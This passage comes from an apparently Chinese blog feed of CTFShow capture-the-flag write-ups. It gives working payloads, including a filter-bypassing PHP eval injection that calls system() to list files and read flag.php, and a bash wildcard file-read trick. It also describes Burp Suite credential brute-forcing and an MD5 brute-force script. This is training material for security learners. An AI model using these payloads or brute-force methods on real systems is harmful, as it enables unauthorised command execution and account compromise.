class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input/output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br><span class="line">&quot;OS error code  11:  Resource temporarily unavailable&quot;</span><br><span class="line">&quot;OS error code  12:  Cannot allocate memory&quot;</span><br><span class="line">&quot;OS error code  13:  Permission denied&quot;</span><br><span class="line">&quot;OS error code  14:  Bad address&quot;</span><br><span class="line">&quot;OS error code  15:  Block device required&quot;</span><br><span class="line">&quot;OS error code  16:  Device or resource busy&quot;</span><br><span class="line">&quot;OS error code  17:  File exists&quot;</span><br><span class="line">&quot;OS error code  18:  Invalid cross-device link&quot;</span><br><span class="line">&quot;OS error code  19:  No such device&quot;</span><br><span class="line">&quot;OS error code  20:  Not a directory&quot;</span><br><span class="line">&quot;OS error code  21:  Is a directory&quot;</span><br><span class="line">&quot;OS error code  22:  Invalid argument&quot;</span><br><span class="line">&quot;OS error code  23:  Too many open files in system&quot;</span><br><span class="line">&quot;OS error code  24:  Too many open files&quot;</span><br><span class="line">&quot;OS error code  25:  Inappropriate ioctl for device&quot;</span><br><span class="line">&quot;OS error code  26:  Text file busy&quot;</span><br><span class="line">&quot;OS error code  27:  File too large&quot;</span><br><span class="line">&quot;OS error code  28:  No space left on device&quot;</span><br><span class="line">&quot;OS error code  29:  Illegal seek&quot;</span><br><span class="line">&quot;OS error code  30:  Read-only file system&quot;</span><br><span class="line">&quot;OS error code  31:  Too many links&quot;</span><br><span class="line">&quot;OS error code  32:  Broken pipe&quot;</span><br><span class="line">&quot;OS error code  33:  Numerical argument out of domain&quot;</span><br><span class="line">&quot;OS error code  34:  Numerical result out of range&quot;</span><br><span class="line">&quot;OS error code  35:  Resource deadlock avoided&quot;</span><br><span class="line">&quot;OS error code  36:  File name too long&quot;</span><br><span class="line">&quot;OS error code  37:  No locks available&quot;</span><br><span class="line">&quot;OS error code  38:  Function not implemented&quot;</span><br><span class="line">&quot;OS error code  39:  Directory not empty&quot;</span><br><span class="line">&quot;OS error code  40:  Too many levels of symbolic links&quot;</span><br><span class="line">&quot;OS error code  42:  No message of desired type&quot;</span><br><span class="line">&quot;OS error code  43:  Identifier removed&quot;</span><br><span class="line">&quot;OS error code  44:  Channel number out of range&quot;</span><br><span class="line">&quot;OS error code  45:  Level 2 not synchronized&quot;</span><br><span class="line">&quot;OS error code  46:  Level 3 halted&quot;</span><br><span class="line">&quot;OS error code  47:  Level 3 reset&quot;</span><br><span class="line">&quot;OS error code  48:  Link number out of range&quot;</span><br><span class="line">&quot;OS error code  49:  Protocol driver not attached&quot;</span><br><span class="line">&quot;OS error code  50:  No CSI structure available&quot;</span><br><span class="line">&quot;OS error code  51:  Level 2 halted&quot;</span><br><span class="line">&quot;OS error code  52:  Invalid exchange&quot;</span><br><span class="line">&quot;OS error code  53:  Invalid request descriptor&quot;</span><br><span class="line">&quot;OS error code  54:  Exchange full&quot;</span><br><span class="line">&quot;OS error code  55:  No anode&quot;</span><br><span class="line">&quot;OS error code  56:  Invalid request code&quot;</span><br><span class="line">&quot;OS error code  57:  Invalid slot&quot;</span><br><span class="line">&quot;OS error code  59:  Bad font file format&quot;</span><br><span class="line">&quot;OS error code  60:  Device not a stream&quot;</span><br><span class="line">&quot;OS error code  61:  No data available&quot;</span><br><span class="line">&quot;OS error code  62:  Timer expired&quot;</span><br><span class="line">&quot;OS error code  63:  Out of streams resources&quot;</span><br><span class="line">&quot;OS error code  64:  Machine is not on the network&quot;</span><br><span class="line">&quot;OS error code  65:  Package not installed&quot;</span><br><span class="line">&quot;OS error code  66:  Object is remote&quot;</span><br><span class="line">&quot;OS error code  67:  Link has been severed&quot;</span><br><span class="line">&quot;OS error code  68:  Advertise error&quot;</span><br><span class="line">&quot;OS error code  69:  Srmount error&quot;</span><br><span class="line">&quot;OS error code  70:  Communication error on send&quot;</span><br><span class="line">&quot;OS error code  71:  Protocol error&quot;</span><br><span class="line">&quot;OS error code  72:  Multihop attempted&quot;</span><br><span class="line">&quot;OS error code  73:  RFS specific error&quot;</span><br><span class="line">&quot;OS error code  74:  Bad message&quot;</span><br><span class="line">&quot;OS error code  75:  Value too large for defined data type&quot;</span><br><span class="line">&quot;OS error code  76:  Name not unique on network&quot;</span><br><span class="line">&quot;OS error code  77:  File descriptor in bad state&quot;</span><br><span class="line">&quot;OS error code  78:  Remote address changed&quot;</span><br><span class="line">&quot;OS error code  79:  Can not access a needed shared library&quot;</span><br><span class="line">&quot;OS error code  80:  Accessing a corrupted shared library&quot;</span><br><span class="line">&quot;OS error code  81:  .lib section in a.out corrupted&quot;</span><br><span class="line">&quot;OS error code  82:  Attempting to link in too many shared libraries&quot;</span><br><span class="line">&quot;OS error code  83:  Cannot exec a shared library directly&quot;</span><br><span class="line">&quot;OS error code  84:  Invalid or incomplete multibyte or wide character&quot;</span><br><span class="line">&quot;OS error code  85:  Interrupted system call should be restarted&quot;</span><br><span class="line">&quot;OS error code  86:  Streams pipe error&quot;</span><br><span class="line">&quot;OS error code  87:  Too many users&quot;</span><br><span class="line">&quot;OS error code  88:  Socket operation on non-socket&quot;</span><br><span class="line">&quot;OS error code  89:  Destination address required&quot;</span><br><span class="line">&quot;OS error code  90:  Message too long&quot;</span><br><span class="line">&quot;OS error code  91:  Protocol wrong type for socket&quot;</span><br><span class="line">&quot;OS error code  92:  Protocol not available&quot;</span><br><span class="line">&quot;OS error code  93:  Protocol not supported&quot;</span><br><span class="line">&quot;OS error code  94:  Socket type not supported&quot;</span><br><span class="line">&quot;OS error code  95:  Operation not supported&quot;</span><br><span class="line">&quot;OS error code  96:  Protocol family not supported&quot;</span><br><span class="line">&quot;OS error code  97:  Address family not supported by protocol&quot;</span><br><span class="line">&quot;OS error code  98:  Address already in use&quot;</span><br><span class="line">&quot;OS error code  99:  Cannot assign requested address&quot;</span><br><span class="line">&quot;OS error code 100:  Network is down&quot;</span><br><span class="line">&quot;OS error code 101:  Network is unreachable&quot;</span><br><span class="line">&quot;OS error code 102:  Network dropped connection on reset&quot;</span><br><span class="line">&quot;OS error code 103:  Software caused connection abort&quot;</span><br><span class="line">&quot;OS error code 104:  Connection reset by peer&quot;</span><br><span class="line">&quot;OS error code 105:  No buffer space available&quot;</span><br><span class="line">&quot;OS error code 106:  Transport endpoint is already connected&quot;</span><br><span class="line">&quot;OS error code 107:  Transport endpoint is not connected&quot;</span><br><span class="line">&quot;OS error code 108:  Cannot send after transport endpoint shutdown&quot;</span><br><span class="line">&quot;OS error code 109:  Too many references: cannot splice&quot;</span><br><span class="line">&quot;OS error code 110:  Connection timed out&quot;</span><br><span class="line">&quot;OS error code 111:  Connection refused&quot;</span><br><span class="line">&quot;OS error code 112:  Host is down&quot;</span><br><span class="line">&quot;OS error code 113:  No route to host&quot;</span><br><span class="line">&quot;OS error code 114:  Operation already in progress&quot;</span><br><span class="line">&quot;OS error code 115:  Operation now in progress&quot;</span><br><span class="line">&quot;OS error code 116:  Stale NFS file handle&quot;</span><br><span class="line">&quot;OS error code 117:  Structure needs cleaning&quot;</span><br><span class="line">&quot;OS error code 118:  Not a XENIX named type file&quot;</span><br><span class="line">&quot;OS error code 119:  No XENIX semaphores available&quot;</span><br><span class="line">&quot;OS error code 120:  Is a named type file&quot;</span><br><span class="line">&quot;OS error code 121:  Remote I/O error&quot;</span><br><span class="line">&quot;OS error code 122:  Disk quota exceeded&quot;</span><br><span class="line">&quot;OS error code 123:  No medium found&quot;</span><br><span class="line">&quot;OS error code 124:  Wrong medium type&quot;</span><br><span class="line">&quot;OS error code 125:  Operation canceled&quot;</span><br><span class="line">&quot;OS error code 126:  Required key not available&quot;</span><br><span class="line">&quot;OS error code 127:  Key has expired&quot;</span><br><span class="line">&quot;OS error code 128:  Key has been revoked&quot;</span><br><span class="line">&quot;OS error code 129:  Key was rejected by service&quot;</span><br><span class="line">&quot;OS error code 130:  Owner died&quot;</span><br><span class="line">&quot;OS error code 131:  State not recoverable&quot;</span><br><span class="line">&quot;MySQL error code 132: Old database file&quot;</span><br><span class="line">&quot;MySQL error code 133: No record read before update&quot;</span><br><span class="line">&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;</span><br><span class="line">&quot;MySQL error code 135: No more room in record file&quot;</span><br><span class="line">&quot;MySQL error code 136: No more room in index file&quot;</span><br><span class="line">&quot;MySQL error code 137: No more records (read after end of file)&quot;</span><br><span class="line">&quot;MySQL error code 138: Unsupported extension used for table&quot;</span><br><span class="line">&quot;MySQL error code 139: Too big row&quot;</span><br><span class="line">&quot;MySQL error code 140: Wrong create options&quot;</span><br><span class="line">&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;</span><br><span class="line">&quot;MySQL error code 142: Unknown character set used&quot;</span><br><span class="line">&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;</span><br><span class="line">&quot;MySQL error code 144: Table is crashed and last repair failed&quot;</span><br><span class="line">&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;</span><br><span class="line">&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;</span><br><span class="line">&quot;MySQL error code 147: Lock table is full;  Restart program with a larger locktable&quot;</span><br><span class="line">&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;</span><br><span class="line">&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;</span><br><span class="line">&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;</span><br><span class="line">&quot;MySQL error code 151: Cannot add a child row&quot;</span><br><span class="line">&quot;MySQL error code 152: Cannot delete a parent row&quot;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure><p>试个几十次就会出来base64 解码拿到flag</p><h2 id="Web124"><a href="#Web124" class="headerlink" title="Web124"></a>Web124</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>不能有特殊字符，不能输入除whitelist内的其他字符</p><p>这里可以利用进制转换构造出字母的思路来绕过</p><blockquote><p>base_convert() 函数在任意进制之间转换数字</p><p>decbin() 函数把十进制转换为二进制</p><p>bindec() 把二进制转换为十进制</p><p>dechex() 把十进制转换为十六进制</p><p>decoct() 把十进制转换为八进制</p><p>hex2bin() 把十六进制值转换为 ASCII 字符</p></blockquote><p>利用动态函数调用的思路</p><p><code>$_GET[abs]($_GET[acos])</code> # 有一个80字符的长度限制 abs，acos是因为只能输入whitelist内的字符</p><p>↓</p><p><code>$_GET&#123;abs&#125;($_GET&#123;acos&#125;)</code> # []被过滤使用{}代替</p><p>↓</p><p>进制转换构造_GET # _GET 10进制:1598506324 16进制5f474554但无法传入字母<br><code>dechex(1598506324)</code> # 5f474554 → <code>hex2bin(dechex(1598506324))</code> # _GET</p><p>↓</p><p><code>base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))</code> # hex2bin无法传入用<code>base_convert(&#39;37907361743&#39;,10,36)</code>代替</p><p>↓</p><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;37907361743&#x27;</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;abs&#125;(<span class="variable">$$pi</span>&#123;acos&#125;);&amp;abs=system&amp;acos=ls <span class="comment"># 查看目录</span></span><br><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;37907361743&#x27;</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;abs&#125;(<span class="variable">$$pi</span>&#123;acos&#125;);&amp;abs=system&amp;acos=cat flag.php <span class="comment"># 查看flag.php</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># $pi 只能传入whitelist内字符</span></span><br><span class="line"><span class="comment"># $$pi $_GET</span></span><br><span class="line"><span class="comment"># $$pi&#123;abs&#125;($$pi&#123;acos&#125;); $_GET&#123;abs&#125;($_GET&#123;acos&#125;)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_爆破</title>
      <link href="/posts/7ba9ac12/"/>
      <url>/posts/7ba9ac12/</url>
      
        <content type="html"><![CDATA[<h2 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h2><p>随便输入抓包</p><p><img src="/posts/7ba9ac12/image-20220319165145359.png" alt="image-20220319165145359"></p><p>发现Base64加密</p><p><img src="/posts/7ba9ac12/image-20220319165235902.png" alt="image-20220319165235902"></p><p>账号和密码用:隔开</p><p>使用BP构造payload爆破</p><p><img src="/posts/7ba9ac12/image-20220319190509094.png" alt="image-20220319190509094"></p><p>下载官方提供的字典 把后缀名改为.zip即可打开</p><p><img src="/posts/7ba9ac12/image-20220319165739427.png" alt="image-20220319165739427"></p><p>使用Custom iterator模式</p><p><img src="/posts/7ba9ac12/image-20220319190606258.png" alt="image-20220319190606258"></p><p>第一部分</p><p><img src="/posts/7ba9ac12/image-20220319190709183.png" alt="image-20220319190709183"></p><p>第二部分</p><p><img src="/posts/7ba9ac12/image-20220319190752812.png" alt="image-20220319190752812"></p><p>第三部分使用字典</p><p><img src="/posts/7ba9ac12/image-20220319190821533.png" alt="image-20220319190821533"></p><p>添加base64加密</p><p><img src="/posts/7ba9ac12/image-20220319190843326.png" alt="image-20220319190843326"></p><p><img src="/posts/7ba9ac12/image-20220319170555561.png" alt="image-20220319170555561"></p><p>关闭url编码</p><p><img src="/posts/7ba9ac12/image-20220319190859899.png" alt="image-20220319190859899"></p><p>爆破完按length排序查看最小的回包</p><p><img src="/posts/7ba9ac12/image-20220319215305817.png" alt="image-20220319215305817"></p><p><img src="/posts/7ba9ac12/image-20220319200822331.png" alt="image-20220319200822331"></p><h2 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h2><p>子域名爆破，爆破ctf.show</p><p><img src="/posts/7ba9ac12/image-20220321152412725.png" alt="image-20220321152412725"></p><p>最终在vip.ctf.show的源码发现了flag</p><p><img src="/posts/7ba9ac12/image-20220321152516231.png" alt="image-20220321152516231"></p><h2 id="Web23"><a href="#Web23" class="headerlink" title="Web23"></a>Web23</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这片代码主要的就是后面这两个if判断 我们需要构造一个符合条件的token</p><p>第一个条件:md5加密后的token第2，15，18位相等</p><p>第二个条件：第2，15，位与 18位&#x2F;2位的值 相加等于第32位</p><p>使用python脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789qazwsxedcrfvtgbyhnujmikolp&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        t = <span class="built_in">str</span>(a) + <span class="built_in">str</span>(b)</span><br><span class="line">        md5 = hashlib.md5(t.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">1</span>:<span class="number">2</span>] == md5[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> md5[<span class="number">14</span>:<span class="number">15</span>] == md5[<span class="number">17</span>:<span class="number">18</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) + <span class="built_in">int</span>(md5[<span class="number">14</span>:<span class="number">15</span>]) + <span class="built_in">int</span>(md5[<span class="number">17</span>:<span class="number">18</span>]) / <span class="built_in">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) == <span class="built_in">int</span>(md5[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>得出结果是 3j</p><p><img src="/posts/7ba9ac12/image-20220321155828841.png" alt="image-20220321155828841"></p><p>拿到flag</p><h2 id="Web24"><a href="#Web24" class="headerlink" title="Web24"></a>Web24</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span 